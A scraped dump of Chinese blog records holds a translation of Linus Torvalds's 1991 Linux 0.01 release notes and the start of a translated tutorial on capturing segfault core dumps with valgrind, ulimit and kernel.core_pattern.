cc二进制文件需要由一个可运行的编译器。这个tar压缩包含有编译器，加载器，汇编程序和支持程序（nm，strip等）。它还包含一个小型的库，可用于大部分程序。</li>\n<li>include.tar.Z–让gcc运行的必要include文件。</li>\n<li>unistd.tar.Z–unistd库程序的源码（即系统调用接口）。通过这个你可以使用系统独立库源码编译一个大一些的库。</li>\n<li>utilbin.tar.Z–各种GNU工具的二进制文件，包括GNU的fileutils，make和tar。也包含克隆emacs的uemacs。</li>\n<li>README, RELNOTES-0.01, INSTALLATION–包含一些（有点过时的）LINUX相关的信息的ascii文件。</li>\n</ul>\n<p>让系统运行的最少文件是OS源码和bash和更新二进制文件。不过只用这些，你做不了什么事。</p>\n<h2>安装</h2>\n<p>在你拿到了必要LINUX文件之后，你需要编译系统和创建root目录。必要的二进制文件需要放到root文件系统中。按如下操作：<br>\n1. 备份你的软件。虽然LINUX从没有毁坏过我的任何文件，但没有什么是必然的。安全胜过遗憾。<br>\n2. 选择/创建一个标准MinixHD-分区作为新的LINUX root文件系统。<br>\n3. 在新的root创建必要的设备节点。LINUX与Minix使用相同类型的节点，所以使用Minix的mknod命令创建下面的设备：节点号与在Minix中相同。</p>\n<ul>\n<li>/dev/tty</li>\n<li>/dev/tty[0-2]</li>\n<li>/dev/hd[0-9]</li>\n</ul>\n<p>4. 将必要文件放到新的root分区。文件应该放在下面目录中：<br>\n希望你现在有一个功能正常的unix，而且你已经root权限登录。LINUX现在没有‘init’过程，只要你注销，系统会同步并等待。使用三指键（Ctrl+Alt+Del）重启机器。</p>\n<ul>\n<li>gcc</li>\n<li>添加链接到你选择的/usr/local/lib中的文件。我将ld，as，nm，strip和size链接到他们相应的 /usr/local/lib/gcc-XXX。</li>\n<li>gccbin.tar.Z中的内容，除了gcc</li>\n<li>include.tar.Z的内容</li>\n<li>utilbin.tar.Z的内容</li>\n<li>sh，即bash.Z</li>\n<li>update</li>\n<li>/bin:</li>\n<li>/usr/bin:</li>\n<li>/usr/include:</li>\n<li>/usr/local/lib:</li>\n<li>/usr/local/bin:</li>\n<li>编辑系统中的linux/include/linux/config.h。这个文件包含了针对于系统的信息：内存空间，硬盘类型，root分区号（同样的与Minix中的编号相同），键盘类型（现在只有US和Finnish）等。</li>\n<li>编译LINUX源码。一个简单技巧就可以完成，在你编辑makefiles为适合你的系统之后（即，删除-mstring-insnsflag，和修改适合你的路径。）1.40之前版本gcc的用户可能需要添加gnulib到makefile中‘LIBS=’一行。</li>\n<li>复制产生的镜像文件到软盘（即，cp Image /dev/PS0 或者之类的）。</li>\n<li>使用新的软盘重启。启动界面应该告诉你系统正在启动（加载系统…），然后是一些必要的文件系统信息（xxx/XXX inodes/blocks free），接下来是一个确定，还有bash提示（如果你没有.bashrc文件，则初始化bash#）。</li>\n</ul>\n<p><strong>LINUX 缺失/不兼容的东西</strong></p>\n<p>LINUX 是打算作为一个全部自给自足的内核，但现在并非如此。作为上面已经提到的，你需要 Minix 来设置启动设备并且检查文件系统当它运行起来的时候。这里有一些其它的不足之处：</p>\n<p>硬件的不兼容。一些 AT 标准特性当前还没有支持。最值得注意的是软盘驱动，利用 LINUX 进行实际工作（备份 etc）当前是不可能的[译者：这个是 oldlinux，这个是 Linus Torvalds 1991 年 10 月写的文章，肯定当时是不行的]。还有串行连接的一些特性没有被实现（2400 bps 波特率的硬连接，没有挂断（hang-up）提示等等 ）。</p>\n<p>标准 c 库的不兼容。gcc 分发版的 libc.a 没有完成，我对免费可发布的库功能很感兴趣。</p>\n<p>一些系统调用没有完全实现。这些设计绝大多数“极少调用”的特性比如调试（谁无论如何需要它的话，你的程序第一次是无法工作的:-)）以及其它的特性。</p>\n<p>如上所述，没有登陆和初始化进程。当前 LINUX 启动在单用户模式，以 root 作为控制台用户。对于一些移植工作足够了，但不是实际可用的。</p>\n<p>387支持[译者：硬件浮点，当时 Intel 发布了外接式 FPU] 没有被实现，即使已有一些基础程序被提供出来。”nic.funet.fi” 的 gcc 二进制包使用软浮点（ie 仿真功能调用）来支持 4 个基础数学运算操作。387-支持将尽快实现当我的电脑安装了这个硬件。希望在一个月或者两个月。</p>\n<p>现在还没有重要的系统管理命令实现在 LINUX 中。这些包括 mkfs, format, fsck, mknod 等。这些命令需要的内核特性还没有实现（format, mknod），一些命令只需要实现它。作为一个库，我欢迎任何免费分发文件。</p>\n<p>如您所见，LINUX还不是一个完整的系统。 感谢您的帮助，使其变得更好。 我对为LINUX重写的Minix命令不感兴趣，除非你自己从头开始编写它们。 您当然可以免费（并鼓励）将您的Minix发行版中的所有内容用于您自己的LINUX系统，但由于Minix的版权，它们无法分发给更广泛的受众。</p>\n<p>这里提到的一些问题将由我（即lines/387/floppy支持）尽快修复，但我希望得到库函数的支持。感谢你们提交的错误报告及补丁还有愿望清单，如果你真的有针对问题的补丁，我会立即尝试去修复它。 小的更改将作为补丁形式发送到邮件列表，并在<code>nic.funet.fi'上设置，如果经过大量重写，或者修复大的补丁，整个系统将在</code>nic.funet.fi’更新。</p>\n<h2>LINUX移植软件</h2>\n<p>LINUX被设计得让移植相对容易。因此，就有了完整的termios实现和一些POSIX库。我所移植的（诚然相对较少）程序没有任何问题。</p>\n<p>尽管LINUX与Minix非常相似，但Minix程序通常并不会比为其他nuix设计的程序更容易移植。因此，我不建议从一个特定程序的Minix版本开始，而应该尝试从头开始移植‘’virgin‘’程序。比BSD更接近SYSV，这意味着当给定一个-DUSG或者-DSYSV标识时，大多数程序很容易移植。</p>\n<p>移植过程中最困难的一点就是缺少库函数。这些必须由你来编写，或者从其他的来源复制（Minix可能是个有缘人）。另外，一些程序（特别是GNU）有各种各样的标识，这些标识可以定义哪些函数不可用（一旦在Makefile中添加了足够量的-DXXX_MISSING标识，GNU fileutils将编译的很好）。</p>\n<h2>已经移植的程序</h2>\n<p>下面这些程序已经移植到LINUX：</p>\n<ul>\n<li>GNU cc (gcc, cc1, cpp)</li>\n<li>GNU assembler (as386)</li>\n<li>GNU binutils (ld, ar, nm, size, strip, ranlib)</li>\n<li>GNU compress (16-bit)</li>\n<li>GNU tar</li>\n<li>GNU make</li>\n<li>GNU bash (Bourne Again SHell)</li>\n<li>GNU sed</li>\n<li>GNU bison (yacc-lookalike)</li>\n<li>GNU awk</li>\n<li>GNU fileutils (ls, cp, rm, mkdir, rmdir, tail etc)</li>\n<li>less</li>\n<li>uemacs</li>\n</ul>\n<p>所有上述程序都能在‘nic.funet.fi’(主要在’/pub/gnu’)中找到，大多数LIINUX-binaries都可以在‘/pub/OS/Linux’目录中找到。包括gcc（cc1）有一些我自己增强的功能，所有这些程序都在没有变化的情况下编译的。先尝试自己编译，遇到问题可以将差异或者资源发邮件给我。</p>\n<p>另外，我提起过明确地GNU差异编译和运行。</p>\n<h2>技术帮助</h2>\n<p>LINUX目前有一个邮件列表，您可以通过邮件发送到这个地址订阅：<a href=\"mailto:Linux-activists-request@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists-request@niksula.hut.fi</strong></a> ，并要求包括在列表中。然后你可以通过这个邮箱：<a href=\"mailto:Linux-activists@niksula.hut.fi\" rel=\"nofollow\"><strong>Linux-activists@niksula.hut.fi</strong></a> 提问题，这将复制你的问题/答案/无论什么，并发送给列表中其他所有人。</p>\n<p>请注意Linux-activists和Linux0activists-request的不同——第一个用于给列表中的所有人发送邮件，第二个仅用于订阅和取消订阅。</p>\n<p>当然，您也可以直接发送邮件至 <a href=\"mailto:torvalds@kruuna.helsinki.fi\" rel=\"nofollow\"><strong>torvalds@kruuna.helsinki.fi</strong></a>。我会尽量在一两天内回答所有的问题。</p>\n<p>尽管‘nic.funet.fi’可能会保持合理的更新状态，但是它还有些问题（即，我无法因为个人得到文件，但可以通过几个人）。因此，如果邮件列表上的人想要补丁或二进制文件，他们将会更快得到。</p>\n<h2>感谢</h2>\n<p>我要感谢学院…</p>\n<p>说真的，如果没有其他人的帮助，这个系统将永远不会有曙光，甚至会变得更糟。Bruce Evans 帮助我找到了需要更改的位置，以便gcc能正确地处理浮点数，并提供许多有用的想法/建议（他的Minix-386用于构建系统）。此外，Earl Chew 的estdio包被用于标准的IO库。像这样更自由地分发包！</p>\n<p>Alain W Black和Richard Tobin为Minix制作了gcc，没有它我就无法编译这个东西。GNU完成了我在Linux下使用的大部分程序。Alfred Leung发送了美国键盘补丁。</p>\n<p>附：“感谢”<a href=\"mailto:wirzeniu@kruuna.helsinki.fi\" rel=\"nofollow\">wirzeniu@kruuna.helsinki.fi</a>他的“建设性”批评和“诙谐”的评论。他是我第一个<img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/412f23f15ba46a043bbcb30c697e34f7.png\" alt=\"$alpha$\" width=\"14\" height=\"14\">-测试者，他应该被授予勇气奖章。</p>\n<p><strong>Linus Torvalds </strong>(<strong>torvalds@kruuna.helsinki.fi</strong>)<strong>  1991</strong>年<strong>10</strong>月<strong>10</strong>日</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114208\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114208votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114208\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/e0ca2411e7d10c43fe25ebc0a22960c9b956bd19.jpg"}
{"url_object_id": "5a2415268c5f41548f265013b49fd955", "title": ["在 Linux 上如何得到一个段错误的核心转储"], "url": "http://blog.jobbole.com/114211/", "create_date": "2018/07/14", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/\">Julia Evans</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9834-1.html\">Linux中国/Stephen</a>   </div><p>本周工作中，我花了整整一周的时间来尝试调试一个段错误。我以前从来没有这样做过，我花了很长时间才弄清楚其中涉及的一些基本事情（获得核心转储、找到导致段错误的行号）。于是便有了这篇博客来解释如何做那些事情！</p>\n<p>在看完这篇博客后，你应该知道如何从“哦，我的程序出现段错误，但我不知道正在发生什么”到“我知道它出现段错误时的堆栈、行号了！ ”。</p>\n<h3 id=\"toc_1\">什么是段错误？</h3>\n<p>“段错误segmentation fault”是指你的程序尝试访问不允许访问的内存地址的情况。这可能是由于：</p>\n<ul>\n<li>试图解引用空指针（你不被允许访问内存地址 <code>0</code>）；</li>\n<li>试图解引用其他一些不在你内存（LCTT 译注：指不在合法的内存地址区间内）中的指针；</li>\n<li>一个已被破坏并且指向错误的地方的 C++ 虚表指针C++ vtable pointer，这导致程序尝试执行没有执行权限的内存中的指令；</li>\n<li>其他一些我不明白的事情，比如我认为访问未对齐的内存地址也可能会导致段错误（LCTT 译注：在要求自然边界对齐的体系结构，如 MIPS、ARM 中更容易因非对齐访问产生段错误）。</li>\n</ul>\n<p>这个“C++ 虚表指针”是我的程序发生段错误的情况。我可能会在未来的博客中解释这个，因为我最初并不知道任何关于 C++ 的知识，并且这种虚表查找导致程序段错误的情况也是我所不了解的。</p>\n<p>但是！这篇博客后不是关于 C++ 问题的。让我们谈论的基本的东西，比如，我们如何得到一个核心转储？</p>\n<h3 id=\"toc_2\">步骤1：运行 valgrind</h3>\n<p>我发现找出为什么我的程序出现段错误的最简单的方式是使用 <code>valgrind</code>：我运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623042334f0503818829\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvalgrind -v your-program\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623042334f0503818829-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334f0503818829-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623042334f0503818829-1\"><span class=\"crayon-v\">valgrind</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">program</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334f0503818829-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这给了我一个故障时的堆栈调用序列。 简洁！</p>\n<p>但我想也希望做一个更深入调查，并找出些 <code>valgrind</code> 没告诉我的信息！ 所以我想获得一个核心转储并探索它。</p>\n<h3 id=\"toc_3\">如何获得一个核心转储</h3>\n<p>核心转储core dump是您的程序内存的一个副本，并且当您试图调试您的有问题的程序哪里出错的时候它非常有用。</p>\n<p>当您的程序出现段错误，Linux 的内核有时会把一个核心转储写到磁盘。 当我最初试图获得一个核心转储时，我很长一段时间非常沮丧，因为 – Linux 没有生成核心转储！我的核心转储在哪里？</p>\n<p>这就是我最终做的事情：</p>\n<ol>\n<li>在启动我的程序之前运行 <code>ulimit -c unlimited</code></li>\n<li>运行 <code>sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code></li>\n</ol>\n<h3 id=\"toc_4\">ulimit：设置核心转储的最大尺寸</h3>\n<p><code>ulimit -c</code> 设置核心转储的最大尺寸。 它往往设置为 0，这意味着内核根本不会写核心转储。 它以千字节为单位。 <code>ulimit</code> 是按每个进程分别设置的 —— 你可以通过运行 <code>cat /proc/PID/limit</code> 看到一个进程的各种资源限制。</p>\n<p>例如这些是我的系统上一个随便一个 Firefox 进程的资源限制：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623042334fa351483026\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat /proc/6309/limits \r\nLimit                     Soft Limit           Hard Limit           Units     \r\nMax cpu time              unlimited            unlimited            seconds   \r\nMax file size             unlimited            unlimited            bytes     \r\nMax data size             unlimited            unlimited            bytes     \r\nMax stack size            8388608              unlimited            bytes     \r\nMax core file size        0                    unlimited            bytes     \r\nMax resident set          unlimited            unlimited            bytes     \r\nMax processes             30571                30571                processes \r\nMax open files            1024                 1048576              files     \r\nMax locked memory         65536                65536                bytes     \r\nMax address space         unlimited            unlimited            bytes     \r\nMax file locks            unlimited            unlimited            locks     \r\nMax pending signals       30571                30571                signals   \r\nMax msgqueue size         819200               819200               bytes     \r\nMax nice priority         0                    0                    \r\nMax realtime priority     0                    0                    \r\nMax realtime timeout      unlimited            unlimited            us   \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334fa351483026-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334fa351483026-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">6309</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">limits </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-2\"><span class=\"crayon-e\">Limit                     </span><span class=\"crayon-e\">Soft </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Hard </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Units     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-3\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">cpu </span><span class=\"crayon-e\">time              </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">seconds   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-4\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-5\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">data </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-6\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">stack </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">8388608</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-7\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">core </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-8\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">resident </span><span class=\"crayon-e\">set          </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-9\"><span class=\"crayon-e\">Max </span><span class=\"crayon-i\">processes</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">processes </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-10\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">open </span><span class=\"crayon-i\">files</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">1048576</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">files     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-11\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">locked </span><span class=\"crayon-i\">memory</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-12\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">address </span><span class=\"crayon-e\">space         </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-13\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">locks            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">locks     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-14\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">pending </span><span class=\"crayon-i\">signals</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">signals   </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-15\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">msgqueue </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-16\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">nice </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-17\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334fa351483026-18\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-e\">timeout      </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-i\">us</span><span class=\"crayon-h\">   </span></div><div class=\"crayon-line\" id=\"crayon-5b623042334fa351483026-19\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n<p>内核在决定写入多大的核心转储文件时使用软限制soft limit（在这种情况下，<code>max core file size = 0</code>）。 您可以使用 shell 内置命令 <code>ulimit</code>（<code>ulimit -c unlimited</code>） 将软限制增加到硬限制hard limit。</p>\n<h3 id=\"toc_5\">kernel.core_pattern：核心转储保存在哪里</h3>\n<p><code>kernel.core_pattern</code> 是一个内核参数，或者叫 “sysctl 设置”，它控制 Linux 内核将核心转储文件写到磁盘的哪里。</p>\n<p>内核参数是一种设定您的系统全局设置的方法。您可以通过运行 <code>sysctl -a</code> 得到一个包含每个内核参数的列表，或使用 <code>sysctl kernel.core_pattern</code> 来专门查看 <code>kernel.core_pattern</code> 设置。</p>\n<p>所以 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code> 将核心转储保存到目录 <code>/tmp</code> 下，并以 <code>core</code> 加上一系列能够标识（出故障的）进程的参数构成的后缀为文件名。</p>\n<p>如果你想知道这些形如 <code>%e</code>、<code>%p</code> 的参数都表示什么，请参考 <a href=\"http://man7.org/linux/man-pages/man5/core.5.html\">man core</a>。</p>\n<p>有一点很重要，<code>kernel.core_pattern</code> 是一个全局设置 —— 修改它的时候最好小心一点，因为有可能其它系统功能依赖于把它被设置为一个特定的方式（才能正常工作）。</p>\n<h3 id=\"toc_6\">kernel.core_pattern 和 Ubuntu</h3>\n<p>默认情况下在 ubuntu 系统中，<code>kernel.core_pattern</code> 被设置为下面的值：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623042334ff508241998\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco 